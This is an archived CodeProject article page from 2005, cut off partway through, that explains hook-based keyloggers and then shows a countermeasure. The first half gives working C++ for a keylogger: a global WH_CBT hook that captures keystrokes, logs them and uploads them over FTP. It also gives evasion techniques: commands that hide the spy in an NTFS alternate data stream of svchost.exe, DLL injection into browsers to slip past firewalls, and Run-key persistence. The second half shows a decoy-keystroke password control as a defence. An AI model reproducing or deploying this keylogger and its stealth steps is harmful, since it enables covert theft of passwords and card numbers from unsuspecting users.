@@ -1,0 +1,990 @@
+
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN">
+<html>
+<head>
+<title>Keyboard Spy: implementation and counter measures - The Code Project - System</title>
+<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1" />
+<META NAME="MS.LOCALE"          content="en-US" />
+<meta NAME="Description"        content="An article on developing hook based key loggers and hook safe software." />
+<meta name="Search.TopicType"   content="kbArticle" />
+<meta name="Author"             content="Dor Alon" />
+<meta name="Search.PublishDate" content="03 May 2005 4:19:00 GMT" />
+<meta name="Search.RevisedDate" content="09 May 2005 5:06:00 GMT" />
+
+<!--<meta name="Search.UserRating"  content="86 %" /> -->
+<meta NAME="keywords" Content="Free source code, System, Visual C++, MFC, Windows, Key, Logger, Spy, Keyboard, Hook, Security">
+<meta NAME="Copyright" CONTENT="Article content copyright Dor Alon, 2005, everthing else Copyright © CodeProject, 1999-2006, All Rights Reserved.">
+<link rel="alternate" type="application/rss+xml" title="CodeProject Lounge Postings" href="http://www.codeproject.com/webservices/LoungeRSS.aspx">
+<link rel="alternate" type="application/rss+xml" title="CodeProject Latest articles - All topics" href="http://www.codeproject.com/webservices/articlerss.aspx?cat=1">
+<link rel="alternate" type="application/rss+xml" title="CodeProject Latest articles - MFC / C++" href="http://www.codeproject.com/webservices/articlerss.aspx?cat=2">
+<link rel="alternate" type="application/rss+xml" title="CodeProject Latest articles - C#" href="http://www.codeproject.com/webservices/articlerss.aspx?cat=3">
+<link rel="alternate" type="application/rss+xml" title="CodeProject Latest articles - ASP.NET" href="http://www.codeproject.com/webservices/articlerss.aspx?cat=4">
+<link rel="alternate" type="application/rss+xml" title="CodeProject Latest articles - .NET" href="http://www.codeproject.com/webservices/articlerss.aspx?cat=5">
+<meta http-equiv="Reply-to" CONTENT="mailto:webmaster@codeproject.com">
+<link rel="icon" href="/favicon.ico" type="image/ico">
+<link rel="SHORTCUT ICON" href="/favicon.ico">
+
+<link rel="stylesheet" type=text/css href="/styles/global.css">
+<script language="javascript" src="/script/oncopy.js"></script>
+
+</head>
+<body text=black bgColor=white aLink=red link=blue vLink=purple topmargin=3 leftmargin=3 
+      oncopy="return copyCode();">
+
+
+<!-- COPYRIGHT 2006 I/PRO Corporation ALL RIGHTS RESERVED. - Page view auditing -->
+<script language="JavaScript">
+var LSPT="";
+LSPT += "?durl=" + escape(document.URL);
+LSPT += "&hostname=" + location.hostname;
+LSPT += "&url=" + location.pathname;
+LSPT += "&query=" + escape(location.search) + escape(location.hash);
+LSPT += "&referrer=" + escape(document.referrer);
+LSPT += "&browser=" + escape(navigator.appName);
+LSPT += "&version=" + escape(navigator.appVersion);
+LSPT += "&os=" + escape(navigator.platform);
+LSPT += "&xdomain=codeproject.com";
+LSPT += "&custid=codeproject";
+</script>
+<script  Language="Javascript">
+document.write('<img src=http://'+'content.ipro.com/images/pixel.gif'+LSPT+' height="1" width="1" style="position:absolute; top:0px; left:0px">');
+</script>
+<noscript>
+<img src="http://content.ipro.com/images/pixel?version=nonjava" height="1" width="1" style="position:absolute;top:0px;left:0px">
+</noscript>
+<!-- END I/PRO PAGE TAG -->
+
+
+<table bgColor=#ff9900 border=0 cellPadding=0 cellSpacing=0 width='100%'>
+<tr><td width="100%">
+<table bgColor=#ff9900 border=0 cellPadding=0 cellSpacing=1 width="100%"><tr>
+
+<td valign=top><a href="http://www.codeproject.com">
+<img border=0 width=225 height=72 src="/images/standard/logo225x72.gif" alt="The Code Project"></a></td>
+<td align=right><span id=AdBanner4><table cellspacing=0 cellpadding=0><tr><td><a class=AdLink href='/script/admentor/ads.asp'>View our advertisers</a></td><td align=right><a class=AdLink href='/info/mediakit'>Advertise with us</a></td></tr><td colspan=2><script language=javascript>document.write("<a href=\"/script/admentor/admentorredir.asp?id=1806&way=ban\" target=_blank><img src=\"/script/ann/ServeImg.aspx?File=%2Fscript%2Fadmentor%2Fimages%2FGrid%5F468x60%2Egif&C=False&id=1806&cb=4176221\" alt=\"\" border=0 width=468 height=60></a>");</script></td></tr></table></span></td>
+
+</tr>
+
+<tr><td colspan=2 bgcolor=#FBEDBB>
+<table cellpadding=3 width=100% border=0 bgcolor=#FBEDBB>
+
+<tr valign=top>
+	<td width=100%>
+		<font style="font-size:8pt"><a href='/?cat=1'>All Topics</a>, <a href='/?cat=2'>MFC / C++</a> &gt;&gt; <a href='/system/'>System</a> &gt;&gt; <a href='/system/#Security'>Security</a></font><br>
+
+		<br><b><font size=4 style="font-size:16pt">Keyboard Spy: implementation and counter measures</font></b><br><b>
+		By <a href="/script/profile/whos_who.asp?id=1932755">Dor Alon</a>
+		</b>
+		<br><br><font style="font-size:9pt">An article on developing hook based key loggers and hook safe software.&nbsp;</font>
+	</td>
+	<td align=right valign=top>
+		<table border=0 cellspacing=0 cellpadding=1 width=200>	
+	
+		<tr><td>&nbsp;</td><td><font size=1 class=SmallText color=red><b>Advanced</b></font></td></tr>
+
+		<tr valign=top><td>&nbsp;</td><td class=SmallText>C++ (VC7.1), C#<br> Windows (Win2K, WinXP), .NET (.NET 1.1)<br> Win32, VS (VS.NET2003), MFC<br> Dev</td></tr>
+		<tr><td>&nbsp;</td><td nowrap class=SmallText>Posted 3 May 2005 14:19</td></tr>
+
+		<tr><td>&nbsp;</td><td class=SmallText>Updated 9 May 2005 15:06</td></tr>
+	
+		<tr valign=top><td><img src="/images/hlp.gif" width=16 height=16></td><td nowrap class=SmallText><a href='/script/Articles/list_articles.asp?userid=1932755'>Articles by this author</a></td></tr>
+
+		<tr valign=top><td></td><td nowrap class=SmallText><b>38,826</b> views</td></tr>
+
+		</table>
+	</td>
+</tr>
+
+
+</table>
+</td></tr>
+
+<tr><td colspan=2>
+
+
+
+<TABLE BORDER=0 CELLPADDING=1 CELLSPACING=0 width=100% id=tblSiteToolbar><TR>
+<form method="post" action="/info/search.asp" name="Search">
+<TD VALIGN=top ALIGN=left width=100%>
+<TABLE BORDER="0" CELLPADDING="1" CELLSPACING="0"><TR VALIGN=center>
+<td class=smallText><b><font color=white>Search:</font></b></td>
+<TD class=navbar nowrap><input class=smallText name="target" 
+
+size="18"
+
+maxlength="255"></TD><td valign=top><select class=smallText name=st>
+<option value="kw">Articles</option>
+<option value="au">Authors</option>
+</select></td>
+<TD><INPUT class=formButton type="submit" value="Go"></TD>
+</TR></TABLE></td>
+</FORM>
+
+
+<TD>
+<div id='MenuPos' style='position:relative;width:380;height:20;'>
+
+<table width=375 cellpadding=2 cellspacing=0 height=20><tr>
+<td><A href='/info/faq.asp' class=NavMenuItem>Help!</a></td>
+<td><A href='/info/latest.asp' class=NavMenuItem>Articles</td>
+<td><A href='/script/comments/forums.asp' class=NavMenuItem>Message Boards</td>
+<td><A href='/store/' class=NavMenuItem>StoreFront</td>
+<td><A href='/lounge.asp' class=NavMenuItem>Lounge</td>
+</tr></table>
+</div>
+</td>
+
+
+</TR></table>
+
+
+<script type='text/javascript'>function Go(){return}</script>
+<script type='text/javascript' src='/script/HVMenu/cpmenu_var.js'></script>
+<script type='text/javascript' src='/script/HVMenu/menu10_com.js'></script>
+
+</td></tr>
+
+</table></td></tr></table>
+
+<table cellspacing=0 cellpadding=1 border=0>
+
+<tr valign=top>
+	<td rowspan=2 valign=top bgcolor=#FBEDBB>
+	<table border=0 cellspacing=0 cellpadding=0>
+		
+
+<script language=javascript>
+function ErrorHandle() {}
+window.onerror = ErrorHandle;
+
+function OnNLSubmit(option)
+{
+	if (option=="up")
+		document.subForm.action = "/script/profile/modify.asp?ct=%2Fsystem%2FKeyLogger%2Easp";
+	else if (option=="in")
+		document.subForm.action = "/script/profile/process_logon.asp?ct=%2Fsystem%2FKeyLogger%2Easp";
+	document.subForm.submit();
+	return true;
+}
+</script>
+
+
+<tr><td>
+<table cellspacing=3 cellpadding=0>
+<tr valign=top><td></td><td></td></tr><tr valign=top><td><img src=/script/images/support_icon.gif width=16 height=16></td><td class=smallText><A HREF='/store/'><b>Ultimate Combo<br>MFC tools $449</b></A></td></tr><tr valign=top><td></td><td></td></tr>
+<tr valign=top>	
+      <td><img src="/images/mail.gif" width=16 height=16></td>
+      <td class=SmallText><a href='/script/recommend/form.asp?guid=KeyLogger%2Fw2k5%2F3%2F2005'>Send to a friend</a></td>
+</tr>
+<tr valign=top><td></td><td></td></tr><tr><td colspan=2 bgcolor=black><img src='/images/space.gif' height=1 width=1></td></tr><tr valign=top><td colspan=2 class=InfoBarHeader><br>Sign in / Sign up</td></tr>
+</table></td></tr>
+
+<tr><td class=smallText>
+<form name="subForm" id=subForm action="/script/profile/process_logon.asp?ct=%2Fsystem%2FKeyLogger%2Easp" method=post>
+<table width=125 border=0 cellpadding=0 cellspacing=0 bgcolor=#ffcc99>
+	<tr><td colspan=2><img src='/images/space.gif' height=3></td></tr>
+
+	<tr>
+		<td class=smallText>&nbsp;Email</td>
+		<td class=smallText><input class=smallText type="text" name="Email" id="Email" style="width: 60px;">
+		</td>
+	</tr>
+	<tr>
+		<td class=smallText>&nbsp;Password</td>
+		<td><input class=smallText type="password" name="Password" id="Password" style="width: 60px;"></td>
+	</tr>
+	<tr>
+		<td colspan=2 class=smallText valign=middle><input type=checkbox checked name=cookie>Remember me</td>
+	</tr>
+	<tr><td colspan=2><img src='/images/space.gif' height=3></td></tr>
+
+
+	<tr>
+		<td align=center><a href='/script/profile/modify.asp'><img border=0 src="/images/signup.gif"></a></td>
+		<td align=center><input border=0 type="image" src="/images/signin.gif"></td>
+	</tr>
+
+
+	<tr><td colspan=2><img src='/images/space.gif' height=3></td></tr>
+</form></table>
+</td></tr>
+
+<tr><td class=smallText><a class=smallText href="/script/profile/forgot.asp" name='HLLink'>Lost your Password?</a></td></tr>
+
+		<tr><td>&nbsp;</td></tr>
+		<tr><td>
+		
+<center><script language=javascript>document.write("<IFRAME src=\"/script/ann/ServeHTML.aspx?C=False&id=1910&cb=4176226\" border=0 frameborder=0 scrolling=no width=120 height=600></IFRAME>");</script><br>
+
+</center><br>
+
+		</td></tr>
+	</table>
+	</td>
+	<td width=5 rowspan=2>
+		<img src='/images/space.gif' width=5 height=1>	
+	</td>
+
+
+
+	<td width=100% align=right bgcolor=white>
+
+
+<table width=100%><tr valign=top><td nowrap valign=top class=smallText><img align=absmiddle src="/images/prize_winner.gif"> &nbsp;<b>Prize winner: May, 2005</b><br><table ><tr><td bgcolor=#ffffff class=smallText><img align=absmiddle src='/images/print.gif'> <a href='/system/KeyLogger.asp?print=true' target=_print>Print</a></td><td bgcolor=#ffffff class=smallText><img align=absmiddle src='/script/images/sitebuild_icon.gif'><a href="/script/submit/ReportProblem.asp?GUID=KeyLogger%2Fw2k5%2F3%2F2005">Broken Article?</a></td><td bgcolor=#ffffff class=smallText><img align=absmiddle src='/images/link.gif'><a href="/script/profile/add_bookmark.asp?t=0&ct=%2Fsystem%2FKeyLogger%2Easp&guid=KeyLogger%2Fw2k5%2F3%2F2005">Bookmark</a></td><td bgcolor=#ffffff class=smallText><img align=absmiddle src='/images/mail_small.gif'> <a href='#__comments'>Discuss</a></td></tr></table>
+</td>
+<td align=right nowrap><a name="__top"></a><table><tr><td align=right class=smallText>41 votes  for this article.</td><td>
+<table border="2" cellpadding="0" cellspacing="0"><tr>
+<td><img src='/script/images/red.gif' width='20' height='5' border='0'></td>
+<td><img src='/script/images/red.gif' width='20' height='5' border='0'></td>
+<td><img src='/script/images/red.gif' width='20' height='5' border='0'></td>
+<td><img src='/script/images/red.gif' width='20' height='5' border='0'></td>
+<td><img src='/script/images/red.gif' width='15' height='5' border='0'><img src='/script/images/white.gif' width='5' height='5' border='0'></td>
+</tr></table>
+</td></tr><tr><td colspan=2 align=right class=smallText><a href='/script/articles/top_articles.asp?st=2' title='Calculated as rating x Log10(# votes)'>Popularity: 7.66</a>. Rating: <b>4.75</b> out of 5.</td></tr></table></td></tr></table>
+
+	</td>
+</tr>
+<tr>
+	<td width=100% valign=top>
+
+<div id="contentdiv">
+
+
+<!-- Article Starts -->
+
+
+<UL class=download>
+<LI><A href="KeyLogger/KeyLogger_src.zip">Download source code - 62.1 Kb</A> 
+<LI><A href="KeyLogger/KeyLogger_demo.zip">Download demo - 320 Kb</A> </LI></UL>
+<P><IMG height=505 alt="Screen capture" src="KeyLogger/KeyLogger1.gif" width=500></P>
+<H2>Introduction</H2>
+<P>In this two parts article, I will examine a simple key logger implementation and suggest ways of defeating it. I hope this article will help you understand how hook based spy software work and how to better protect your software against it.</P>
+<P>It should be noted that keyboard loggers can be implemented without the usage of hooks.</P>
+<H2>Background</H2>
+<P>Software based key loggers are a serious security threat as they are used to monitor user actions by capturing keystrokes. The monitoring can be used for malicious purposes such as credit cards numbers theft. Key loggers are a common component of Trojans, they operate quietly in the background and capture whatever the user types on the keyboard. The keystrokes are stored in a well-hidden file that is sent by either email or FTP to the spying person.</P>
+<H2>Part 1 - The Keyboard Spy</H2>
+<P>This is a simple straightforward hook based implementation.</P>
+<H2>Keyboard Spy Architecture</H2>
+<P>The keyboard spy is composed of three modules: the main module, the hook-procedure and the FTP module. The main module installs a global <CODE>WH_CBT</CODE> hook-procedure. The hook-procedure reports back to the main module every time a keyboard key was pressed. The main module logs all keystrokes to a file. When the log file reaches a certain predefined size, the main module commands the FTP module to upload the log file to an FTP server. The communications between the various modules are performed using window messages.</P>
+<P><IMG height=285 alt="Sample image" src="KeyLogger/KeyLogger2.gif" width=597></P>
+<P>The Main module window procedure:</P><PRE><span class='cpp-comment'>/////////////////////////////////////////////////////////////////////////////</span>
+<span class='cpp-comment'>//</span>
+<span class='cpp-comment'>//  FUNCTION: WndProc(HWND, unsigned, WORD, LONG)</span>
+<span class='cpp-comment'>//</span>
+<span class='cpp-comment'>//  PURPOSE:  Processes messages for the main window.</span>
+<span class='cpp-comment'>//</span>
+<span class='cpp-comment'>//  MSG_MY_WM_KEYDOWN    - Process an application keystroke</span>
+<span class='cpp-comment'>//  MSG_MY_WM_SETFOCUS    - Process an application keystroke</span>
+<span class='cpp-comment'>//  MSG_WM_UPLOAD_FILE    - Process an FTP Module notification</span>
+<span class='cpp-comment'>//  WM_DESTROY    - post a quit message and return</span>
+<span class='cpp-comment'>//</span>
+<span class='cpp-comment'>//</span>
+LRESULT CALLBACK WndProc(HWND hWnd, UINT message, WPARAM wParam, LPARAM lParam)
+{
+    <span class='cpp-keyword'>if</span> (message == MSG_MY_WM_KEYDOWN)
+        <span class='cpp-keyword'>return</span> OnInterceptKeyStroke(wParam, lParam);
+
+    <span class='cpp-keyword'>if</span> (message == MSG_MY_WM_SETFOCUS)
+        <span class='cpp-keyword'>return</span> OnSetKeyboardFocus(wParam, lParam);
+
+    <span class='cpp-keyword'>if</span> (message == MSG_WM_UPLOAD_FILE)
+        <span class='cpp-keyword'>return</span> OnFileUploaded(wParam, lParam);
+     
+    <span class='cpp-keyword'>switch</span> (message)
+    {    
+    <span class='cpp-keyword'>case</span> WM_DESTROY:
+        PostQuitMessage(<span class='cpp-literal'>0</span>);
+        <span class='cpp-keyword'>break</span>;
+        
+    <span class='cpp-keyword'>default</span>:
+        <span class='cpp-keyword'>return</span> DefWindowProc(hWnd, message, wParam, lParam);
+    }
+    <span class='cpp-keyword'>return</span> <span class='cpp-literal'>0</span>;
+}
+
+<span class='cpp-comment'>/////////////////////////////////////////////////////////////////////////////</span>
+
+LRESULT OnInterceptKeyStroke(WPARAM wParam, LPARAM lParam) 
+{
+    <span class='cpp-comment'>//If we are logging a new application we should print an appropriate header </span>
+    <span class='cpp-keyword'>if</span> (g_hWinInFocus != g_hLastWin)
+    {
+        WriteNewAppHeader(g_hWinInFocus);  
+        g_hLastWin = g_hWinInFocus;
+    }
+    
+    <span class='cpp-keyword'>if</span> (wParam==VK_RETURN || wParam==VK_TAB)
+    {
+        WriteToLog('\n');
+    }
+    <span class='cpp-keyword'>else</span>
+    {
+        BYTE keyStateArr[<span class='cpp-literal'>256</span>];
+        WORD word;
+        UINT scanCode = lParam;
+        <span class='cpp-keyword'>char</span> ch;
+
+        <span class='cpp-comment'>//Translate virtual key code to ascii</span>
+        GetKeyboardState(keyStateArr);
+        ToAscii(wParam, scanCode, keyStateArr, &amp;word, <span class='cpp-literal'>0</span>);
+        ch = (<span class='cpp-keyword'>char</span>) word;
+        
+        <span class='cpp-keyword'>if</span> ((GetKeyState(VK_SHIFT) &amp; <span class='cpp-literal'>0x8000</span>) &amp;&amp; wParam &gt;= 'a' &amp;&amp; wParam &lt;= 'z')
+            ch += 'A'-'a';
+
+        WriteToLog(ch); 
+
+    }
+    <span class='cpp-keyword'>return</span> <span class='cpp-literal'>0</span>;
+}
+
+<span class='cpp-comment'>/////////////////////////////////////////////////////////////////////////////</span>
+
+LRESULT OnSetKeyboardFocus(WPARAM wParam, LPARAM lParam) 
+{
+    g_hWinInFocus = (HWND)wParam;
+    
+    <span class='cpp-keyword'>return</span> S_OK;
+}
+
+<span class='cpp-comment'>/////////////////////////////////////////////////////////////////////////////</span>
+
+LRESULT OnFileUploaded(WPARAM wParam, LPARAM lParam) 
+{
+    <span class='cpp-comment'>//Log file was uploaded succesfully</span>
+    <span class='cpp-keyword'>if</span> (wParam)
+    {
+        DeleteFile(g_sSpyLogFileName2);
+    }
+    <span class='cpp-keyword'>else</span>
+    {
+        <span class='cpp-keyword'>char</span> temp[<span class='cpp-literal'>255</span>];
+        FILE* f1=fopen(g_sSpyLogFileName,<span class='cpp-string'>"rt"</span>);
+        FILE* f2=fopen(g_sSpyLogFileName2,<span class='cpp-string'>"at"</span>);
+        
+        <span class='cpp-keyword'>while</span> (!feof(f1))
+        {
+            <span class='cpp-keyword'>if</span> (fgets(temp, <span class='cpp-literal'>255</span>, f1))
+            {
+                fputs(temp, f2);
+            }
+        }
+        
+        fclose(f1);
+        fclose(f2);
+        
+        MoveFile(g_sSpyLogFileName2, g_sSpyLogFileName);
+    }
+    
+    g_isUploading = <span class='cpp-keyword'>false</span>;
+    <span class='cpp-keyword'>return</span> S_OK;
+}</PRE>
+<H2>Global WH_CBT hooks</H2>
+<P>A system-wide hook is a function that is installed in all of the running processes to monitor messages before they reach the target window procedure. Hook procedures are used to monitor the system for various types of events such as keystrokes. You can install a hook procedure by calling the <CODE>SetWindowsHookEx</CODE> WinAPI and specifying the type of hook calling the procedure. A <CODE>WH_CBT</CODE> hook procedure is called before windows get focus and before keyboard events are removed from the system message queue. A global hook procedure is called in the context of all applications in the desktop, so the procedure must reside in a separate DLL from the application installing the hook procedure.</P>
+<H2>DLL shared memory area</H2>
+<P>A DLL shared memory area is a variable that is visible to all instances of the DLL. The main module stores its window handle on the shared memory area of the hook-procedure DLL which enables all instances of the hook-procedure to post window messages back to the main module.</P>
+<P>The Hook-Procedure shared memory area and exported functions:</P><PRE><span class='cpp-comment'>//////////////////////////////////////////////////////////////////////////</span>
+<span class='cpp-comment'>//Shared memory</span>
+<span class='cpp-preprocessor'>#pragma data_seg(".adshared")</span>
+HWND g_hSpyWin = NULL;
+<span class='cpp-preprocessor'>#pragma data_seg()</span>
+<span class='cpp-preprocessor'>#pragma comment(linker, "/SECTION:.adshared,RWS")</span>
+
+<span class='cpp-comment'>//////////////////////////////////////////////////////////////////////////</span>
+
+<span class='cpp-keyword'>void</span> CALLBACK SetSpyHwnd (DWORD hwnd)
+{
+    g_hSpyWin = (HWND) hwnd;
+}
+
+<span class='cpp-comment'>//////////////////////////////////////////////////////////////////////////</span>
+
+LRESULT CALLBACK HookProc (<span class='cpp-keyword'>int</span> nCode, WPARAM wParam, LPARAM lParam )
+{                
+    <span class='cpp-keyword'>if</span> (nCode == HCBT_KEYSKIPPED &amp;&amp; (lParam &amp; <span class='cpp-literal'>0x40000000</span>))
+    {        
+        <span class='cpp-keyword'>if</span> ((wParam==VK_SPACE)||(wParam==VK_RETURN)|| 
+            (wParam==VK_TAB)||(wParam&gt;=<span class='cpp-literal'>0x2f</span> ) &amp;&amp;(wParam&lt;=<span class='cpp-literal'>0x100</span>)) 
+        {
+            ::PostMessage(g_hSpyWin, MSG_MY_WM_KEYDOWN, wParam, lParam);
+        }
+    }
+    <span class='cpp-keyword'>else</span> <span class='cpp-keyword'>if</span> (nCode == HCBT_SETFOCUS)
+    {
+        ::PostMessage(g_hSpyWin, MSG_MY_WM_SETFOCUS, wParam, lParam);
+
+        <span class='cpp-keyword'>if</span> (bInjectFtpDll &amp;&amp; ::FindWindow(COMM_WIN_CLASS, NULL) == NULL)
+        {
+            HINSTANCE hFtpDll;
+            Init InitFunc;
+
+            <span class='cpp-keyword'>if</span> (hFtpDll = ::LoadLibrary(FTP_DLL_NAME))
+            {
+                <span class='cpp-keyword'>if</span> (InitFunc = (Init) ::GetProcAddress (hFtpDll,<span class='cpp-string'>"Init"</span>))
+                {
+                    (InitFunc)((DWORD)g_hSpyWin);
+                }
+            }
+
+            bInjectFtpDll = <span class='cpp-keyword'>false</span>;
+        }
+    }
+
+    <span class='cpp-keyword'>return</span> CallNextHookEx( <span class='cpp-literal'>0</span>, nCode, wParam, lParam);
+}</PRE>
+<P>The Main module <CODE>InstallHook</CODE> function:</P><PRE><span class='cpp-keyword'>typedef</span> LRESULT (CALLBACK *HookProc)(<span class='cpp-keyword'>int</span> nCode, WPARAM wParam, LPARAM lParam);
+<span class='cpp-keyword'>typedef</span> <span class='cpp-keyword'>void</span> (WINAPI *SetSpyHwnd)(DWORD);
+
+HMODULE g_hHookDll =    NULL;
+HHOOK   g_hHook =       NULL;
+
+<span class='cpp-keyword'>bool</span> InstallHook(HWND hwnd)
+{
+    SetSpyHwnd SetHwndFunc;
+    HookProc HookProcFunc;
+    
+    <span class='cpp-keyword'>if</span> (g_hHookDll = LoadLibrary(SPY_DLL_NAME))
+    {
+        <span class='cpp-keyword'>if</span> (SetHwndFunc = (SetSpyHwnd) ::GetProcAddress (g_hHookDll,<span class='cpp-string'>"SetSpyHwnd"</span>))
+        {
+            <span class='cpp-comment'>//Store Main Module HWND in to the shared memory</span>
+                        (SetHwndFunc)((DWORD)hwnd);
+            
+            <span class='cpp-keyword'>if</span> (HookProcFunc = (HookProc) ::GetProcAddress (g_hHookDll,<span class='cpp-string'>"HookProc"</span>))
+            {
+                <span class='cpp-keyword'>if</span> (g_hHook = SetWindowsHookEx(WH_CBT, HookProcFunc, g_hHookDll, <span class='cpp-literal'>0</span>))
+                    <span class='cpp-keyword'>return</span> <span class='cpp-keyword'>true</span>;
+            }
+        }
+    }
+    
+    <span class='cpp-keyword'>return</span> <span class='cpp-keyword'>false</span>;
+}</PRE>
+<H2>Stealth</H2>
+<P>A spy program must hide its tracks to prevent detection. There are three major areas where stealth techniques must be employed: File system, Task manger and Firewalls. Assigning benign files names to all the binaries is essential. I kept the "shady" file names for the sake of clarity.</P>
+<H2>Task Manager Stealth</H2>
+<P>ADS is an NTFS feature that enables to fork a file data into existing files without affecting their functionality, size, or display to file browsing utilities like Windows Explorer. Files with an ADS are almost impossible to detect using native file browsing techniques. Once injected, the ADS can be executed by using traditional commands like <I>type</I>. When launched, the ADS executable will appear to run as the original file - looking undetectable to process viewers like Windows Task Manager. Using this method, it is not only possible to hide a file, but to also hide the execution of an illegitimate process. It is virtually impossible to natively protect your system against ADS hidden files if you use NTFS. The use of Alternate Data Streams is not a feature that can be disabled and currently there is no way to limit this capability against files that the user already has access to. The demo setup does not use Alternate Data Streams (ADS) for the sake of clarity.</P>
+<P>You can use the following sample to manually use ADS:</P><PRE lang=text>Inject spy.exe to svchost.exe 
+"type spy.exe &gt; c:\windows\system32\svchost.exe:spy.exe" 
+
+Run spy.exe
+"start svchost.exe:spy.exe"</PRE>
+<H2>Firewall Stealth</H2>
+<P>Most firewall software will detect and block unauthorized programs from connecting to the Internet. The Main module uploads the log file to an FTP server using the FTP module. Firewall stealth is achieved by injecting the FTP module DLL to another already installed application. DLL injection means to force an unsuspecting running process to accept a DLL file that it never requested. I chose to inject the FTP module to either Internet Explorer or FireFox. DLL injection will outsmart most Firewall software, especially if the FTP server is listening on port 80 (HTTP port). The Hook-procedure DLL, which is loaded automatically in all running processes by <CODE>SetWindowsHookEx</CODE>, checks whether it was loaded in Internet Explorer or FireFox and loads (<CODE>LoadLibrary</CODE>) the FTP Module DLL. Calling <CODE>LoadLibrary</CODE> from <CODE>DllMain</CODE> is forbidden, so <CODE>DllMain</CODE> sets a Boolean variable that causes the hook procedure to call <CODE>LoadLibrary</CODE>.</P>
+<P>Hook-procedure module <CODE>DllMain</CODE>.</P><PRE>BOOL APIENTRY DllMain( HANDLE hModule, 
+           DWORD  ul_reason_for_call, LPVOID lpReserved)
+{
+    <span class='cpp-keyword'>switch</span> (ul_reason_for_call)
+    {
+    <span class='cpp-keyword'>case</span> DLL_PROCESS_ATTACH:
+        {
+            <span class='cpp-keyword'>char</span> processName[<span class='cpp-literal'>255</span>];
+            GetModuleFileName(GetModuleHandle( NULL ), 
+                         processName, <span class='cpp-keyword'>sizeof</span>(processName) );
+
+            strcpy(processName, _strlwr(processName));
+            
+            <span class='cpp-keyword'>if</span> (strstr(processName, <span class='cpp-string'>"iexplore.exe"</span>) || 
+                         strstr(processName, <span class='cpp-string'>"firefox.exe"</span>))
+                bInjectFtpDll = <span class='cpp-keyword'>true</span>;
+            <span class='cpp-keyword'>break</span>;
+        }
+
+    <span class='cpp-keyword'>case</span> DLL_THREAD_ATTACH: 
+    <span class='cpp-keyword'>case</span> DLL_THREAD_DETACH:
+    <span class='cpp-keyword'>case</span> DLL_PROCESS_DETACH:
+        <span class='cpp-keyword'>break</span>;
+    }
+    <span class='cpp-keyword'>return</span> TRUE;
+}</PRE>
+<H2>Startup</H2>
+<P>Adding the spy program to the following registry key will launch it on startup time: <I>HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run</I>.</P>
+<P>The demo setup program adds <I>spy.exe</I> as a new registry value.</P>
+<H2>Part 2 - Counteracting the Keyboard Spy</H2>
+<P>In this section, I'll demonstrate two simple techniques that will guard your application against hook based spies.</P>
+<H2>The spy safe password edit control</H2>
+<P><IMG height=518 alt="Sample image" src="KeyLogger/KeyLogger3.gif" width=404></P>
+<P>The spy safe edit control generates a random sequence of simulated keystrokes for every user keystroke. A spy program will capture the user key strokes and the pseudo keystrokes, making it hard if not impossible to retrieve the actual text typed. The user input is stored in a member variable that is easily accessible to the application using the edit control. The pseudo keystrokes are generated using the <CODE>SendInput</CODE> WinAPI. I've implemented an MFC control and a .NET control.</P>
+<P>The safe edit control assumes that <CODE>SendInput</CODE> generates keystrokes faster than the user. This might cause the safe edit to return false user data on slower machines especially when using the C# implementation.</P>
+<P>MFC <CODE>CSafeEdit</CODE>:</P><PRE><span class='cpp-keyword'>void</span> CSafeEdit::OnKeyUp(UINT nChar, UINT nRepCnt, UINT nFlags) 
+{
+    <span class='cpp-keyword'>if</span> (nChar == VK_SHIFT || nChar == VK_CONTROL || nChar == VK_MENU)
+         <span class='cpp-keyword'>return</span>;
+
+     <span class='cpp-keyword'>if</span> (nChar == VK_DELETE || nChar == VK_BACK)
+     {
+         SetWindowText(<span class='cpp-string'>""</span>);
+         m_sRealText = <span class='cpp-string'>""</span>; 
+         <span class='cpp-keyword'>return</span>;
+     }
+
+    <span class='cpp-keyword'>if</span> (m_state == <span class='cpp-literal'>0</span>)
+    {
+        m_iDummyKeyStrokesCount = SendDummyKeyStrokes();
+
+        m_state = <span class='cpp-literal'>1</span>;
+
+        CString text;
+        GetWindowText(text);
+
+        m_sRealText += text.Right(<span class='cpp-literal'>1</span>);            
+    }
+    <span class='cpp-keyword'>else</span>
+    {
+        <span class='cpp-keyword'>if</span> (m_state++ &gt;= m_iDummyKeyStrokesCount)            
+            m_state = <span class='cpp-literal'>0</span>;
+    }
+
+
+    CEdit::OnKeyUp(nChar, nRepCnt, nFlags);
+}
+
+<span class='cpp-comment'>/////////////////////////////////////////////////////////////////////////////</span>
+
+CString CSafeEdit::GetRealText()
+{
+    <span class='cpp-keyword'>return</span> m_sRealText;
+}
+
+<span class='cpp-comment'>/////////////////////////////////////////////////////////////////////////////</span>
+
+<span class='cpp-keyword'>int</span> CSafeEdit::SendDummyKeyStrokes()
+{
+    srand((<span class='cpp-keyword'>unsigned</span>)::GetTickCount());
+    <span class='cpp-keyword'>int</span> iKeyStrokeCount = rand() % <span class='cpp-literal'>5</span> + <span class='cpp-literal'>1</span>;
+
+    <span class='cpp-keyword'>int</span> key;
+    INPUT inp[<span class='cpp-literal'>2</span>];
+    inp[<span class='cpp-literal'>0</span>].type = INPUT_KEYBOARD;    
+    inp[<span class='cpp-literal'>0</span>].ki.dwExtraInfo = ::GetMessageExtraInfo();
+    inp[<span class='cpp-literal'>0</span>].ki.dwFlags = <span class='cpp-literal'>0</span>;
+    inp[<span class='cpp-literal'>0</span>].ki.time = <span class='cpp-literal'>0</span>;
+
+    <span class='cpp-keyword'>for</span> (<span class='cpp-keyword'>int</span> i=<span class='cpp-literal'>0</span>; i &lt; iKeyStrokeCount; i++) 
+    {
+        key = rand() % ('Z'-'A') + 'A';
+        inp[<span class='cpp-literal'>0</span>].ki.wScan = key;
+        inp[<span class='cpp-literal'>0</span>].ki.wVk = key;
+
+        inp[<span class='cpp-literal'>1</span>] = inp[<span class='cpp-literal'>0</span>];
+        inp[<span class='cpp-literal'>1</span>].ki.dwFlags = KEYEVENTF_KEYUP;
+
+        SendInput(<span class='cpp-literal'>2</span>, inp, <span class='cpp-keyword'>sizeof</span>(INPUT));    
+    }
+
+    <span class='cpp-keyword'>return</span> iKeyStrokeCount;
+}
+    
+        </PRE>
+<P>C# <CODE>SafeEdit</CODE>:</P><PRE lang=cs>        <span class='cs-keyword'>public</span> <span class='cs-keyword'>struct</span> KEYDBINPUT 
+        {
+            <span class='cs-keyword'>public</span> Int16 wVk;
